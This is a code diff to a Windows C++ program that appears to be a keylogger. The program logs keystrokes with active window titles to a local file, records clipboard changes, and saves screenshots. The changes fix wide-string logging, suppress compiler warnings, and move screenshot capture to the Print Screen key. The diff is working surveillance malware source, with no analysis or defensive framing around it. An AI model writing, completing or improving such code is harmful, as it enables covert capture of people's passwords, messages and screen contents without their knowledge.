@@ -1,3 +1,8 @@
+#define _CRT_SECURE_NO_WARNINGS
+#define _CRT_NON_CONFORMING_SWPRINTFS
+
+#pragma warning(disable: 4530)
+
 #pragma comment(lib, "User32.lib")
 #pragma comment(lib, "gdi32.lib")
 #include <iostream>
@@ -74,7 +79,7 @@ void writeLogs(std::wstring buf, std::wstring windowTitle) {
 	logfile << getDate();
 	logfile << L" - '";
 	logfile << windowTitle;
-	logfile << "' - ";
+	logfile << L"' - ";
 	logfile << buf << std::endl;
 	logfile.close();
 }
@@ -122,7 +127,7 @@ void writeClipboardChange(){
 
 	logfile.open("logs.txt", std::ios::app);
 	logfile.imbue(utf8_locale);
-	logfile << std::endl << "***ClipBoard Change*** : *";
+	logfile << std::endl << L"***ClipBoard Change*** : *";
 	logfile << getClipboardText() << "*" << std::endl << std::endl;
 }
 
@@ -145,7 +150,7 @@ void	saveScreenToFile(HBITMAP hBitmap){
 	CImage image;
 	image.Attach(hBitmap);
 	std::string filename = getScreenFileName();
-	//std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
+	image.Save(filename.c_str());
 }
 
 /* takeScreen() first sets the awareness context for window to get the correct screen dimensions then create a compatible bitmap*/
@@ -166,9 +171,9 @@ void	takeScreen(){
     HDC     hScreen = GetDC(NULL);
     HDC     hDC     = CreateCompatibleDC(hScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
-    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-    BOOL    bRet    = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
 
+    SelectObject(hDC, hBitmap);
+    BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
 	saveScreenToFile(hBitmap);
 }
 
@@ -207,7 +212,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[DOWN ARROW]";
 	else if (vkCode == VK_SNAPSHOT){
 		result = L"[PRINT SCREEN]";
-		//takeScreen();
+		takeScreen();
 	}
 	else if (vkCode == VK_NUMLOCK)
 		result = L"[NUMLOCK]";
@@ -215,11 +220,11 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		result = L"[WINDOWS]";
 	else if (vkCode == 255){
 		result = L"[FN]";
-		takeScreen();
+		//takeScreen();
 	}
 	else if (vkCode >= 112 && vkCode <=120){
 		result = L"[F";
-		result += (wchar_t)vkCode-63; // 112-63=49(ascii for '1');		
+		result += std::to_wstring(vkCode-63); // 112-63=49(ascii for '1');		
 		result += L']';
 	}
 	else if (vkCode == 121)
@@ -243,7 +248,7 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		if (GetKeyState(VK_CONTROL) & 0x8000){
 			lpKeyState[VK_CONTROL] = 0;
 		}
-		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
+		ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
 		result += buff[0];
 	}
 	return result;
